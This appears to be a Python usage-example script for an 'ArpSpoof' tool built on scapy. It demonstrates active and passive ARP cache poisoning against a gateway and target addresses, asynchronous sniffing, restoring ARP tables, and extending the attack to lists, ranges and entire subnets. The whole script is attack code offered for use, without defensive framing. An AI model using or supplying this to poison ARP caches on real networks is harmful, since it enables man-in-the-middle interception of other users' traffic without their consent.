from ArpSpoof import SpooferARP
from scapy.config import conf

spoofer = SpooferARP('172.20.10.1', '10.1.8.1')
spoofer.active_cache_poisonning()

spoofer = SpooferARP('172.20.10.1', '10.1.8.1', conf.iface, False, 0.5)
spoofer.passive_cache_poisonning(asynchronous=True)
spoofer.run = False
spoofer.sniffer.stop()                                   # only with asynchronous mode
spoofer.restore()                                        # only with asynchronous mode

# Multiple targets
spoofer = SpooferARP('127.0.0.1', '127.0.0.2,127.0.0.3') # Spoof multiple targets
spoofer = SpooferARP('127.0.0.1', '127.0.0.2-127.0.0.5') # Spoof range of targets
spoofer = SpooferARP('127.0.0.1', '127.0.0.0/30')        # Spoof all network
